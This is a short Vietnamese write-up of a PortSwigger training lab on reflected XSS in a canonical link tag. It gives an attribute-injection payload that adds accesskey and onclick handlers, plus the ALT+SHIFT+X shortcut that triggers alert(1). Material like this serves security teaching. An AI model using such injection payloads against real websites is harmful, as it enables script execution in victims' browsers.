# Lab: Reflected XSS in canonical link tag

**Lab URL:** [PortSwigger Lab](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag)

## Mô tả

Bài lab này yêu cầu ta thực hiện trigger với shortcut key để khiến website alert().

## Khai thác

Vậy thì chỉ có thể dùng `accesskey` để kêu nó alert thôi:

`Payload: .?accesskey='x'onclick='alert(1)`

Alert được gọi khi ta nhấn "ALT+SHIFT+X":

![Trigger](canonical-link-tag/trigger.png)

## Kết quả

Và solved:

![Solved](canonical-link-tag/solved.png)
